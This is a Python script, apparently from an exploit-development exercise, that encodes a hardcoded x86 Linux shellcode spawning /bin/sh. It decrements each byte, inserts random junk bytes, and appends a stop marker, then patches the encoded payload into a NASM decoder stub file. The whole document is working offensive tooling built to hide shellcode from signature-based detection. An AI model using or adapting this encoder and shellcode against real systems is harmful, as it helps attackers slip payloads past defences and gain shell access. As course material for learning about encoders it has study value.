#!/usr/bin/python

# Python Insertion Encoder 
import random
import sys


# Source: https://deckbsd.wordpress.com/2016/07/05/python-methode-rol/

def ror(x, n, bits = 8):
    mask = (2**n) - 1
    mask_bits = x & mask
    return (x >> n) | (mask_bits << (bits - n))
 
def rol(x, n, bits = 8):
    return ror(x, bits - n, bits)

    

def get_stop_code(shellcode):
	list_codes = bytearray(shellcode)
	min_number = min(list_codes)
	max_number = max(list_codes)
	stop_code = 0
	if min_number > 1:
		stop_code = min_number - 1
	elif max_number < 254:
		stop_code = max_number + 1
	else:
		for i in range (1,254):
			if i not in list_codes:
				stop_code = i
				break
	if stop_code is 0:
		print "It is not possible to use this encoding :("
		sys.exit(1)
	return stop_code



shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
#shellcode = (sys.argv[1])
encoded = ""
encoded2 = ""

stop_code = get_stop_code(shellcode)
hex_stop_code = '{:02X}'.format(stop_code).lower()



for x in bytearray(shellcode) :
	
	#x = rol(x, 1, 8)
	x = x - 1

	number = random.randint(0,255)
	while number == stop_code:
	   number = random.randint(0,255)

	'''
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % number
	'''

	encoded2 += '0x'
	encoded2 += '%02x,' %x
	encoded2 += '0x%02x,' % number

encoded += '\\x'+hex_stop_code+'\\x'+hex_stop_code
encoded2 += '0x'+hex_stop_code+',0x'+hex_stop_code

#print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))


lines = open('insertion-decoder.nasm').read().splitlines()

new_file_lines = []

for l in lines:
	if l.endswith("marker1"):
		new_l = "	xor bl, 0x"
		new_l += hex_stop_code
		new_l += " ; marker1"
		new_file_lines.append(new_l)

	elif l.endswith("marker2"):
		new_l = "	EncodedShellcode: db "
		new_l += encoded2
		new_l += " ; marker2"
		new_file_lines.append(new_l)

	else:
		new_file_lines.append(l)

open('insertion-decoder.nasm','w').write('\n'.join(new_file_lines))


